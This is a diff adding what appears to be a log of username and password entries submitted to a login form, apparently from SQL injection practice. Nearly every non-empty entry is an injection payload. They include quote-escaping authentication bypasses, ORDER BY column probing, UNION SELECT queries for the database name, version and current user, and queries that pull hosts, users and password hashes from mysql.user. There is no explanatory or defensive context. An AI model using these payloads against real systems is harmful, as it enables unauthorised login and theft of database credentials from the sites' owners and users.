@@ -1,0 +1,122 @@
+User Name:admin
+Password:
+User Name:admin'' or ''1''=''1-- -
+Password:sdf
+User Name:admin'' or ''1''=''1
+Password:
+User Name:admin'' or ''1''=1''#
+Password:ads
+User Name:
+Password:
+User Name:dsaf
+Password:
+User Name:sdf
+Password:
+User Name:admin'' or ''1''=''1#
+Password:fsd
+User Name:admin'' or ''1''=''1#
+Password:
+User Name:admin'') or ''1''=''1#
+Password:
+User Name:admin'') or ''1''=''1
+Password:)
+User Name:admin'') or ''1''=''1#)
+Password:
+User Name:admin'')
+Password:sdf
+User Name:admin")
+Password:sf
+User Name:admin") or "1"="1
+Password:
+User Name:admin")#
+Password:
+User Name:admin")-- 
+Password:
+User Name:admin")--
+Password:
+User Name:admin")--+
+Password:
+User Name:admin")-- -
+Password:
+User Name:admin") or "1"="1#
+Password:
+User Name:admin") or "1"="1"#
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:admin")
+Password:
+User Name:admin")#
+Password:
+User Name:admin") order by 4
+Password:
+User Name:admin") order by 4-- 
+Password:
+User Name:admin") order by 3-- 
+Password:
+User Name:admin") order by 2-- 
+Password:
+User Name:admin") union select 1,2-- 
+Password:
+User Name:admin") union select database(),version()-- 
+Password:
+User Name:admin") union select database(),version()-- 
+Password:
+User Name:admine") union select database(),version()-- 
+Password:
+User Name:admine") union select database(),current_user()-- -
+Password:
+User Name:admin")union select concat(host,0x7c,user,0x7c,password),2,3 from mysql.user where host = 'localhost'#
+Password:
+User Name:admin")union select concat(host,0x7c,user,0x7c),2,3 from mysql.user where host = 'localhost'#
+Password:
+User Name:admin")union select concat(host,user),2 from mysql.user where host = 'localhost'#
+Password:
+User Name:admin")union select concat(host,0x7c,user,0x7c,password),2 from mysql.user where host = 'localhost'#
+Password:
+User Name:admin")union select concat(host,0x7c,user,0x7c,password),2 from mysql.user where host = 'localhost'-- -
+Password:
+User Name:admins")union select concat(host,0x7c,user,0x7c,password),2 from mysql.user where host = 'localhost'-- -
+Password:
+User Name:admin'
+Password:
+User Name:admin"
+Password:
+User Name:admin")
+Password:
+User Name:1")
+Password:
+User Name:a")#
+Password:
+User Name:a")-- -
+Password:
+User Name:a");show databases;-- -
+Password:
+User Name:a");union select databases;-- -
+Password:
+User Name:a");union select database;-- -
+Password:
+User Name:a");union select database,1;-- -
+Password:
+User Name:a");union select database(),1;-- -
+Password:
+User Name:a") union select database(),1;-- -
+Password:
+User Name:a") union select database,1;-- -
+Password:
